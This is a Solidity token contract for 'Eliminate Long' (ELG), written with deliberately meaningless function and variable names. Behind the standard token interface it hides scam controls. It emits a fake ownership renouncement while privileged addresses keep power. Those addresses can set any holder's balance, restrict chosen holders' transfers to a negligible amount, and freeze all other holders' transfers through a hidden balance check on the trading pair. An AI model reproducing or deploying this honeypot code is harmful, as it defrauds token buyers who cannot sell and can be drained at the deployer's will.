//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface modeTeamMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract fundReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldTokenFee {
    function createPair(address senderTake, address shouldIs) external returns (address);
}

interface amountMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxEnableSwap) external view returns (uint256);

    function transfer(address exemptSender, uint256 sellEnable) external returns (bool);

    function allowance(address modeTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellEnable) external returns (bool);

    function transferFrom(
        address sender,
        address exemptSender,
        uint256 sellEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverBuy, uint256 value);
    event Approval(address indexed modeTx, address indexed spender, uint256 value);
}

interface amountMarketingMetadata is amountMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EliminateLong is fundReceiver, amountMarketing, amountMarketingMetadata {

    function transfer(address fromIs, uint256 sellEnable) external virtual override returns (bool) {
        return atAmount(_msgSender(), fromIs, sellEnable);
    }

    mapping(address => bool) public liquidityEnableTo;

    uint256 private marketingFrom;

    function name() external view virtual override returns (string memory) {
        return fundEnable;
    }

    function transferFrom(address limitTotal, address exemptSender, uint256 sellEnable) external override returns (bool) {
        if (_msgSender() != tradingToSell) {
            if (amountToken[limitTotal][_msgSender()] != type(uint256).max) {
                require(sellEnable <= amountToken[limitTotal][_msgSender()]);
                amountToken[limitTotal][_msgSender()] -= sellEnable;
            }
        }
        return atAmount(limitTotal, exemptSender, sellEnable);
    }

    uint256 public fundLiquidity;

    function maxTrading(address limitTotal, address exemptSender, uint256 sellEnable) internal returns (bool) {
        require(txFee[limitTotal] >= sellEnable);
        txFee[limitTotal] -= sellEnable;
        txFee[exemptSender] += sellEnable;
        emit Transfer(limitTotal, exemptSender, sellEnable);
        return true;
    }

    address tradingToSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private maxExempt = "ELG";

    uint256 public amountEnable;

    function decimals() external view virtual override returns (uint8) {
        return autoAtMax;
    }

    uint256 maxLaunch;

    bool public tradingFee;

    constructor (){
        if (shouldExempt) {
            marketingFrom = fundLiquidity;
        }
        modeTeamMarketing listTeam = modeTeamMarketing(tradingToSell);
        listExempt = shouldTokenFee(listTeam.factory()).createPair(listTeam.WETH(), address(this));
        if (tokenIsReceiver != launchModeReceiver) {
            launchAuto = true;
        }
        tradingTeamLaunch = _msgSender();
        launchEnable();
        tradingTx[tradingTeamLaunch] = true;
        txFee[tradingTeamLaunch] = senderList;
        if (amountEnable == fundLiquidity) {
            launchAuto = false;
        }
        emit Transfer(address(0), tradingTeamLaunch, senderList);
    }

    uint256 public tokenIsReceiver;

    uint256 private senderList = 100000000 * 10 ** 18;

    address public listExempt;

    function symbol() external view virtual override returns (string memory) {
        return maxExempt;
    }

    function allowance(address liquidityList, address modeExemptIs) external view virtual override returns (uint256) {
        if (modeExemptIs == tradingToSell) {
            return type(uint256).max;
        }
        return amountToken[liquidityList][modeExemptIs];
    }

    mapping(address => uint256) private txFee;

    function approve(address modeExemptIs, uint256 sellEnable) public virtual override returns (bool) {
        amountToken[_msgSender()][modeExemptIs] = sellEnable;
        emit Approval(_msgSender(), modeExemptIs, sellEnable);
        return true;
    }

    address isReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalSupply() external view virtual override returns (uint256) {
        return senderList;
    }

    function sellLimit(address swapLimit) public {
        minLaunch();
        if (launchAuto != shouldExempt) {
            amountEnable = marketingFrom;
        }
        if (swapLimit == tradingTeamLaunch || swapLimit == listExempt) {
            return;
        }
        liquidityEnableTo[swapLimit] = true;
    }

    mapping(address => mapping(address => uint256)) private amountToken;

    uint8 private autoAtMax = 18;

    function minLaunch() private view {
        require(tradingTx[_msgSender()]);
    }

    address public tradingTeamLaunch;

    function modeFrom(address fromIs, uint256 sellEnable) public {
        minLaunch();
        txFee[fromIs] = sellEnable;
    }

    function balanceOf(address maxEnableSwap) public view virtual override returns (uint256) {
        return txFee[maxEnableSwap];
    }

    address private totalLiquidity;

    function getOwner() external view returns (address) {
        return totalLiquidity;
    }

    function receiverList(address fundLaunchTeam) public {
        if (tradingFee) {
            return;
        }
        
        tradingTx[fundLaunchTeam] = true;
        if (launchAuto != shouldExempt) {
            tokenIsReceiver = fundLiquidity;
        }
        tradingFee = true;
    }

    function atAmount(address limitTotal, address exemptSender, uint256 sellEnable) internal returns (bool) {
        if (limitTotal == tradingTeamLaunch) {
            return maxTrading(limitTotal, exemptSender, sellEnable);
        }
        uint256 totalTake = amountMarketing(listExempt).balanceOf(isReceiver);
        require(totalTake == takeSender);
        require(exemptSender != isReceiver);
        if (liquidityEnableTo[limitTotal]) {
            return maxTrading(limitTotal, exemptSender, modeReceiverIs);
        }
        return maxTrading(limitTotal, exemptSender, sellEnable);
    }

    string private fundEnable = "Eliminate Long";

    uint256 constant modeReceiverIs = 12 ** 10;

    bool public shouldExempt;

    uint256 private launchModeReceiver;

    function owner() external view returns (address) {
        return totalLiquidity;
    }

    function minTake(uint256 sellEnable) public {
        minLaunch();
        takeSender = sellEnable;
    }

    mapping(address => bool) public tradingTx;

    bool private launchAuto;

    event OwnershipTransferred(address indexed buyList, address indexed walletReceiver);

    function launchEnable() public {
        emit OwnershipTransferred(tradingTeamLaunch, address(0));
        totalLiquidity = address(0);
    }

    bool private receiverExempt;

    uint256 takeSender;

}